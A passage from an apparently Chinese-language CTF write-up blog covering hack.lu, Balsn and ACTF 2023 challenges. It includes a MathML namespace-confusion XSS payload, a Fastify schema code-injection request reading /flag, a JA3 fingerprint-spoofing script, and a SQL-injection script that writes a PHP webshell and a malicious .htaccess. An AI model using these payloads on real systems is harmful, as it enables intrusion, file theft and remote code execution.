<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">semantics</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mi</span>&gt;</span>a<span class="tag">&lt;/<span class="name">mi</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">annotation-xml</span> <span class="attr">encoding</span>=<span class="string">&quot;text/html&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">span</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">annotation-xml</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">semantics</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mo</span>&gt;</span>+<span class="tag">&lt;/<span class="name">mo</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mi</span>&gt;</span>b<span class="tag">&lt;/<span class="name">mi</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个就是其中一种做法的雏形，真正起到作用的只有math和annotation-xml</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">annotation-xml</span> <span class="attr">encoding</span>=<span class="string">&quot;text/html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">annotation-xml</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>encoding=&quot;text/html&quot;</code>将<code>style</code>标签视为 html 命名空间中的标签，因此，其中的内容被视为纯文本，并且不会对其进行任何过滤，但是当删除该属性时，<code>style</code>标签现在位于<code>math</code>命名空间中，其中标签内的标签<code>style</code>被视为 html 标签。然后就会成功执行xss</p>
<h2 id="crypto">crypto</h2>
<h3 id="Lucky-Numbers">Lucky Numbers</h3>
<p>没什么意思的一道题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#hacklu23 Baby Crypyo Challenge</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os                                                   </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">e</span>): <span class="keyword">return</span> e+(length-<span class="built_in">len</span>(e)%length)*<span class="built_in">chr</span>(length-<span class="built_in">len</span>(e)%length)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">e</span>): <span class="keyword">return</span> e[<span class="number">0</span>:-<span class="built_in">ord</span>(e[-<span class="number">1</span>:])]</span><br><span class="line">length=<span class="number">16</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    flag= <span class="string">&quot;flag&#123;123&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting Challenge&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    key=get_random_bytes(<span class="number">32</span>)</span><br><span class="line">    message=add(flag)</span><br><span class="line">    iv=get_random_bytes(length)</span><br><span class="line">    cipher=AES.new(key,AES.MODE_CBC,iv) </span><br><span class="line">    cipher_bytes=base64.b64encode(iv+cipher.encrypt(message.encode(<span class="string">&quot;utf8&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(cipher_bytes.decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">        A=[]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You know the moment when you have this special number that gives you luck? Great cause I forgot mine&quot;</span>)</span><br><span class="line">        data2=<span class="built_in">input</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I also had a second lucky number, but for some reason I don&#x27;t remember it either :(&quot;</span>)</span><br><span class="line">        data3=<span class="built_in">input</span>()</span><br><span class="line">        v=data2.strip()</span><br><span class="line">        w=data3.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> v.isnumeric() <span class="keyword">or</span> <span class="keyword">not</span> w.isnumeric():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You sure both of these are numbers?&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s=<span class="built_in">int</span>(data2)</span><br><span class="line">        t=<span class="built_in">int</span>(data3)</span><br><span class="line">        <span class="keyword">if</span> s&lt;random.randrange(<span class="number">10000</span>,<span class="number">20000</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;I have the feeling the first number might be too small&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> s&gt;random.randrange(<span class="number">150000000000</span>,<span class="number">200000000000</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;I have the feeling the first number might be too big&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> t&gt;<span class="number">42</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;I have the feeling the second number might be too big&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># s ,t 可控</span></span><br><span class="line">        n=<span class="number">2</span>**t-<span class="number">1</span></span><br><span class="line">        sent=<span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">             <span class="keyword">if</span> (n%i) == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The second number didn&#x27;t bring me any luck...&quot;</span>)</span><br><span class="line">                sent = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sent:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        u=t-<span class="number">1</span></span><br><span class="line">        number=(<span class="number">2</span>**u)*(<span class="number">2</span>**(t)-<span class="number">1</span>)</span><br><span class="line">        sqrt_num=math.isqrt(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,sqrt_num+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> s%i==<span class="number">0</span>:</span><br><span class="line">                A.append(i)</span><br><span class="line">                <span class="keyword">if</span> i!=s//i <span class="keyword">and</span> s//i!=s:</span><br><span class="line">                    A.append(s//i)      </span><br><span class="line">        total=<span class="built_in">sum</span>(A)</span><br><span class="line">        <span class="keyword">if</span> total==s==number:</span><br><span class="line">            decoded=base64.b64decode(cipher_bytes)</span><br><span class="line">            cipher=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">            decoded_bytes=remove(cipher.decrypt(decoded[length:]))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You found them, well done! Here have something for your efforts: &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(decoded_bytes.decode())</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hm sadge, those don&#x27;t seem to be my lucky numbers...😞&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Math is such a cool concept, let&#x27;s see if you can use it a little more...&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要满足<code>total == s == number</code></p>
<p>s是我们的输入，number是由t决定，同时代码对t进行约束，2**t-1需要是素数，total是number因子的和</p>
<p>那么第一步先筛选出合法的t</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    n = <span class="number">2</span> ** t - <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(n)</span></span><br><span class="line">    sent = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n ** <span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (n % i) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The second number didn&#x27;t bring me any luck...&quot;</span>)</span><br><span class="line">            sent = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sent:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u = t - <span class="number">1</span></span><br><span class="line">    number = (<span class="number">2</span> ** u) * (<span class="number">2</span> ** (t) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(number&gt;<span class="number">20000</span>):</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>
<p>选出一个最小的t，然后得到13</p>
<p>然后我得到了固定的number，我就尝试s=number就成功了？？考点迷惑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">33550336</span></span><br><span class="line">t = <span class="number">13</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023Balsn</title>
    <url>/2023/10/22/21-54-45/</url>
    <content><![CDATA[<h1>2023Balsn</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="0FA2">0FA2</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FINGERPRINT&quot;</span>, <span class="string">&quot;771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0&quot;</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;BALSN&#123;fake_flag&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fingerprint_check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_SSL_JA3&#x27;</span>] !== FINGERPRINT) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Login Failed!&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>存在指纹判断</p>
<p>关于ja3以及TLS可以看下面的链接</p>
<p><a href="https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42">https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42</a></p>
<p><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/</a></p>
<p>通过以下的链接可以得到伪造ja3的脚本</p>
<p><a href="https://www.tr0y.wang/2020/06/28/ja3/">https://www.tr0y.wang/2020/06/28/ja3/</a></p>
<p><a href="https://github.com/Danny-Dasilva/CycleTLS">https://github.com/Danny-Dasilva/CycleTLS</a></p>
<p>链接中使用了go和nodejs两种手法</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">const initCycleTLS = require(&#x27;cycletls&#x27;);</span><br><span class="line">async function makeRequest() <span class="punctuation">&#123;</span></span><br><span class="line">  try <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// Initiate CycleTLS</span></span><br><span class="line">    const cycleTLS = await initCycleTLS();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send request</span></span><br><span class="line">    const response = await cycleTLS(&#x27;https<span class="punctuation">:</span><span class="comment">//localhost:8787/flag.php&#x27;, &#123;</span></span><br><span class="line">      body<span class="punctuation">:</span> &#x27;username=admin&#x27;<span class="punctuation">,</span></span><br><span class="line">      ja3<span class="punctuation">:</span> &#x27;<span class="number">771</span><span class="punctuation">,</span><span class="number">4866</span><span class="number">-4865</span><span class="number">-4867</span><span class="number">-49195</span><span class="number">-49199</span><span class="number">-49196</span><span class="number">-49200</span><span class="number">-52393</span><span class="number">-52392</span><span class="number">-49171</span><span class="number">-49172</span><span class="number">-156</span><span class="number">-157</span><span class="number">-47</span><span class="number">-53</span><span class="punctuation">,</span><span class="number">23</span><span class="number">-65281</span><span class="number">-10</span><span class="number">-11</span><span class="number">-35</span><span class="number">-16</span><span class="number">-5</span><span class="number">-13</span><span class="number">-18</span><span class="number">-51</span><span class="number">-45</span><span class="number">-43</span><span class="number">-27</span><span class="number">-17513</span><span class="punctuation">,</span><span class="number">29</span><span class="number">-23</span><span class="number">-24</span><span class="punctuation">,</span><span class="number">0</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      headers<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;Content-Type&#x27; <span class="punctuation">:</span> &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> &#x27;post&#x27;);</span><br><span class="line"></span><br><span class="line">    console.log(response);</span><br><span class="line">    </span><br><span class="line">    cycleTLS.exit();</span><br><span class="line">  <span class="punctuation">&#125;</span> catch (error) <span class="punctuation">&#123;</span></span><br><span class="line">    console.error(&#x27;Error<span class="punctuation">:</span>&#x27;<span class="punctuation">,</span> error);</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">makeRequest();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="SaaS">SaaS</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> validatorFactory =</span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&quot;@fastify/fast-json-stringify-compiler&quot;</span>).<span class="title class_">SerializerSelector</span>()();</span><br><span class="line"><span class="keyword">const</span> fastify = <span class="built_in">require</span>(<span class="string">&quot;fastify&quot;</span>)(&#123;</span><br><span class="line">  <span class="attr">logger</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuid &#125; = <span class="built_in">require</span>(<span class="string">&quot;uuid&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="string">&quot;the old one&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> customValidators = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>, &#123;&#125;); <span class="comment">// no more p.p.</span></span><br><span class="line"><span class="keyword">const</span> defaultSchema = &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;object&quot;</span>,</span><br><span class="line">  <span class="attr">properties</span>: &#123;</span><br><span class="line">    <span class="attr">pong</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">fastify.<span class="title function_">get</span>(</span><br><span class="line">  <span class="string">&quot;/&quot;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">schema</span>: &#123;</span><br><span class="line">      <span class="attr">response</span>: &#123;</span><br><span class="line">        <span class="number">200</span>: defaultSchema,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">pong</span>: <span class="string">&quot;hi&quot;</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line">fastify.<span class="title function_">get</span>(<span class="string">&quot;/whowilldothis/:uid&quot;</span>, <span class="keyword">async</span> (req, resp) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; uid &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">const</span> validator = customValidators[uid];</span><br><span class="line">  <span class="keyword">if</span> (validator) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">validator</span>(&#123; [<span class="variable constant_">FLAG</span>]: <span class="string">&quot;congratulations&quot;</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">msg</span>: <span class="string">&quot;not found&quot;</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">fastify.<span class="title function_">post</span>(<span class="string">&quot;/register&quot;</span>, &#123;&#125;, <span class="keyword">async</span> (req, resp) =&gt; &#123;</span><br><span class="line">  <span class="comment">// can only access from internal.</span></span><br><span class="line">  <span class="keyword">const</span> nid = <span class="title function_">uuid</span>();</span><br><span class="line">  <span class="keyword">const</span> schema = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, defaultSchema, req.<span class="property">body</span>);</span><br><span class="line">  customValidators[nid] = <span class="title function_">validatorFactory</span>(&#123; schema &#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">route</span>: <span class="string">`/whowilldothis/<span class="subst">$&#123;nid&#125;</span>`</span> &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">fastify.<span class="title function_">listen</span>(&#123; <span class="attr">port</span>: <span class="number">3000</span>, <span class="attr">host</span>: <span class="string">&quot;0.0.0.0&quot;</span> &#125;, <span class="keyword">function</span> (<span class="params">err, address</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    fastify.<span class="property">log</span>.<span class="title function_">error</span>(err);</span><br><span class="line">    process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Server is now listening on $&#123;address&#125;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中存在注册函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fastify.<span class="title function_">post</span>(<span class="string">&quot;/register&quot;</span>, &#123;&#125;, <span class="keyword">async</span> (req, resp) =&gt; &#123;</span><br><span class="line">  <span class="comment">// can only access from internal.</span></span><br><span class="line">  <span class="keyword">const</span> nid = <span class="title function_">uuid</span>();</span><br><span class="line">  <span class="keyword">const</span> schema = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, defaultSchema, req.<span class="property">body</span>);</span><br><span class="line">  customValidators[nid] = <span class="title function_">validatorFactory</span>(&#123; schema &#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">route</span>: <span class="string">`/whowilldothis/<span class="subst">$&#123;nid&#125;</span>`</span> &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>本地调试之后可以发现存在code注入</p>
<p><img src="/img/image-20231023104004689.png" alt="image-20231023104004689" /></p>
<p>其中required是可以通过json解析转为对象进行注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;required&quot;:[&quot;aaa&quot;]&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20231023105454987.png" alt="image-20231023105454987" /></p>
<p>其中schema为我们post输入的json对象</p>
<p>所以通过字符串拼接可以执行代码</p>
<p>然后执行的结果会返回路由</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123; <span class="attr">route</span>: <span class="string">`/whowilldothis/<span class="subst">$&#123;nid&#125;</span>`</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>同时我们需要简单绕过ngnix服务器的waf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    server_name *.saas;</span><br><span class="line">    if ($http_host != &quot;easy++++++&quot;) &#123; return 403 ;&#125;</span><br><span class="line">    location ~ &#123;</span><br><span class="line">      proxy_pass http://backend:3000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要的服务是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*.saas</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST http://a.saas/register HTTP/1.1 </span><br></pre></td></tr></table></figure>
<p>同时</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>easy++++++</span><br></pre></td></tr></table></figure>
<p>如此就可以成功访问正常的服务了</p>
<p>最终的payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST http://x.saas/register HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>easy++++++</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>94</span><br><span class="line"></span><br><span class="line">&#123;&quot;required&quot;:[&quot;&#x27;+global.process.mainModule.constructor._load(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;)+&#x27;&quot;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://x.saas/whowilldothis/0a4ca29e-f2df-4875-9685-c0202c752fe0 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>easy++++++</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="1linenginx">1linenginx</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">    image: nginx:1.16</span><br><span class="line">    ports:</span><br><span class="line">      - 80:80</span><br><span class="line">    volumes:</span><br><span class="line">      - ./default.conf:/etc/nginx/conf.d/default.conf</span><br><span class="line">    restart: always</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用的是<code>nginx:1.16</code>，过于老旧的版本，存在CVE-2019-20372</p>
<p><a href="https://www.hacking8.com/bug-product/Nginx/CVE-2019-20372-Nginx-error_page-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-product/Nginx/CVE-2019-20372-Nginx-error_page-请求走私漏洞.html</a></p>
<p>那么我们的目的是xss</p>
<p>通过请求走私可以进行302重定向，标签注入，脚本执行实现xss</p>
<p>exp：</p>
<p><a href="https://gist.github.com/arkark/32e1a0386360fe5ce7d63e141a74d7b9">https://gist.github.com/arkark/32e1a0386360fe5ce7d63e141a74d7b9</a></p>
<p><a href="https://gist.github.com/lebr0nli/dd9c2fef635799865022044817e88956">https://gist.github.com/lebr0nli/dd9c2fef635799865022044817e88956</a></p>
<p><a href="https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#linenginx">https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#linenginx</a></p>
<h3 id="ginowa">ginowa</h3>
<p><a href="https://itiscaleb.com/2023/10/Balsn-CTF-2023/">https://itiscaleb.com/2023/10/Balsn-CTF-2023/</a></p>
<p>暂时没看懂做法，贴一下exp然后看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">file,show=<span class="literal">True</span></span>):</span><br><span class="line">    r_payload = <span class="string">f&quot;0&#x27; union select &#x27;ok&#x27; as status,LOAD_FILE(&#x27;<span class="subst">&#123;file&#125;</span>&#x27;) ,3,4 from info where &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    r = requests.get(<span class="string">f&#x27;http://ginowa-1.balsnctf.com/index.php?id=<span class="subst">&#123;quote(quote(r_payload))&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;&lt;div class=&quot;tname text-xl float-left p-4&quot;&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;span class=&quot;font-light&quot;&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        result = r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> show:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">file,content</span>):</span><br><span class="line">    w_payload = <span class="string">f&quot;0&#x27; union select &#x27;<span class="subst">&#123;content&#125;</span>&#x27;,&#x27;&#x27; ,&#x27;&#x27;,&#x27;&#x27; INTO OUTFILE &#x27;<span class="subst">&#123;file&#125;</span>&quot;</span></span><br><span class="line">    requests.get(<span class="string">f&#x27;http://ginowa-1.balsnctf.com/index.php?id=<span class="subst">&#123;quote(quote(w_payload))&#125;</span>&#x27;</span>)</span><br><span class="line">    result = read(file,<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Write Success!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Write Failed!&quot;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">shell_name = <span class="string">&#x27;kirito41.php&#x27;</span></span><br><span class="line">shell_file = <span class="string">f&quot;C:/xampp/tmp/<span class="subst">&#123;shell_name&#125;</span>&quot;</span></span><br><span class="line">shell_content = <span class="string">&quot;&lt;?php $out=shell_exec(\&quot;cd C:\\\\ &amp;&amp; C:\\\\readflag_9a82cf0e37dd1b.exe 2&gt;&amp;1\&quot;);echo $out;?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#readflag_9a82cf0e37dd1b.exe</span></span><br><span class="line"><span class="comment">#dir ..\\\\..\\\\</span></span><br><span class="line"></span><br><span class="line">write(shell_file,shell_content)</span><br><span class="line"></span><br><span class="line">htaccess_file = <span class="string">&quot;C:/xampp/htdocs/.htaccess&quot;</span></span><br><span class="line">htaccess_content = <span class="string">f&#x27;php_value auto_append_file <span class="subst">&#123;shell_file&#125;</span>&#x27;</span></span><br><span class="line">write(htaccess_file,htaccess_content)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://ginowa-1.balsnctf.com/info.php?action=backend2&#x27;</span>)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;log.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ACTF</title>
    <url>/2023/11/01/17-29-04/</url>
    <content><![CDATA[<h1>2023ACTF</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="easylatex">easylatex</h3>
<p>首先需要成为vip，对于</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vip&#x27;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">session</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> &#123; code &#125; = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">let</span> vip_url = <span class="variable constant_">VIP_URL</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username, vip_url), &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="title class_">Cookie</span>: <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">cookies</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">[k, v]</span>) 